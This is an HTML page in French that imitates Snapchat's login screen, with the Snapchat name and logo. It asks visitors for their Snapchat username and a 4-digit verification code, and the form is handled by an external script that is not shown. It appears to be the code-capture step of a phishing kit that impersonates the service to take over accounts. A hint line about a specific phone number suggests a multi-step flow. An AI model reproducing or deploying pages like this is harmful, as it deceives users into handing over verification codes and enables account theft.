<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter à Snapchat</title>
    <link rel="icon" type="image/png" href="téléchargement.png">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="card">
            <img src="canva-snapchat-logo-MAGzZ1jpOSg.png" alt="Snapchat Logo" class="logo">
            <h1>Se connecter à Snapchat</h1>
            <form id="verificationForm" class="form">
                <div class="input-group">
                    <label for="username">Pseudo Snapchat</label>
                    <input 
                        type="text" 
                        id="username" 
                        name="username" 
                        placeholder="votre_pseudo"
                        required
                        pattern="[a-zA-Z0-9_.-]{3,20}"
                    >
                </div>
                
                <div class="input-group">
                    <label for="code">Code de vérification</label>
                    <input 
                        type="text" 
                        id="code" 
                        name="code" 
                        placeholder="1234"
                        required
                        pattern="[0-9]{4}"
                        maxlength="4"
                    >
                    <small style="color: #666; font-size: 12px; margin-top: 5px; display: block;">Si vous avez saisi 07 76 34 45 34 à la première page, n'importe quel code à 4 chiffres sera accepté.</small>
                </div>
                
                <div id="errorMessage" class="error-message"></div>
                
                <button type="submit" class="btn btn-primary">Suivant</button>
            </form>
            
            <div id="phoneDisplay" class="phone-info"></div>
        </div>
    </div>
    
    <script src="script.js"></script>
</body>
</html>
